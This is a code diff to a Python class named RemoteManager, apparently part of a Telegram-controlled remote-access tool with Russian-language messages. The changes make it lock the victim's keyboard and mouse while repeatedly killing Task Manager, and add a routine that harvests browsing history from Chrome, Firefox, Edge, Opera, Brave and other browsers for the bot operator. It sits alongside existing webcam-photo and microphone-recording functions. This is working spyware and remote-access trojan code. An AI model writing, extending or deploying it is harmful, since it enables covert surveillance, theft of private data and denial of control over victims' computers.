@@ -9,18 +9,22 @@ import wave
 import cv2
 import keyboard
 import numpy as np
+import psutil as psutil
 import pyaudio
 import pyautogui
 import pyttsx3
 import webbrowser
-
 import win32con
 import win32gui
+
 from aiogram import types
 from pynput.mouse import Controller
+from browser_history.browsers import OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome
 
 
 class RemoteManager:
+    browsers = [OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome]
+
     def __init__(self, bot):
         self.bot = bot
         self.USER_NAME = getpass.getuser()
@@ -107,25 +111,38 @@ class RemoteManager:
         engine.runAndWait()
 
     def blockinput(self):
-        global block_input_flag
-        block_input_flag = 1
-        t1 = threading.Thread(target=self.blockinput_start)
-        t1.start()
-        print("[SUCCESS] Input blocked!")
+        if not self.block_input_flag:
+            self.block_input_flag = True
+            t1 = threading.Thread(target=self.blockinput_start)
+            t1.start()
+
+            result = "Ввод заблокирован!"
+        else:
+            result = "Уже заблокировано!"
+
+        return result
 
     def blockinput_stop(self):
-        global block_input_flag
-        for i in range(150):
-            keyboard.unblock_key(i)
-        block_input_flag = 0
+        if self.block_input_flag:
+            for i in range(150):
+                keyboard.unblock_key(i)
+            self.block_input_flag = False
+
+            result = "Ввод разблокирован"
+        else:
+            result = "Ввод уже разблокирован"
+
+        return result
 
     def blockinput_start(self):
         mouse = Controller()
-        global block_input_flag
         for i in range(150):
             keyboard.block_key(i)
-        while block_input_flag == 1:
-            mouse.position = (0, 0)
+        while self.block_input_flag:
+            for proc in psutil.process_iter():
+                mouse.position = (0, 0)
+                if proc.name().lower() == 'taskmgr.exe':
+                    proc.terminate()
 
     def make_cam_photo(self):
         cap = cv2.VideoCapture(0)
@@ -231,6 +248,33 @@ class RemoteManager:
         waveFile.close()
 
         return types.InputFile(path_or_bytesio='file.wav')
+
+    def get_history(self, date):
+        all_history = f'История браузеров на {date}, вы можете указать дату в формате команды \n' \
+                      f'/history 2022-08-10 \n'
+        for browser in self.browsers:
+            try:
+                br = browser()
+                output_history = br.fetch_history()
+
+                history = output_history.histories
+
+                browser_his = ""
+                for h in history:
+                    if str(h[0].date()) == date:
+                        browser_his += '-- ' + h[1] + '\n\n'
+
+                if browser_his:
+                    all_history += f"История {br.name} \n" + browser_his
+                else:
+                    all_history += f"История {br.name} на {date} пуста \n"
+
+            except FileNotFoundError:
+                all_history += str(browser.name + ": Браузер не найден \n")
+            except AssertionError:
+                all_history += str(browser.name + ": Браузер не поддерживается ОС \n")
+
+        return all_history
 
     def change_background(self, path='C:\\Users\\Dima\\PycharmProjects\\tgbot'):
         SPI_SETDESKWALLPAPER = 20
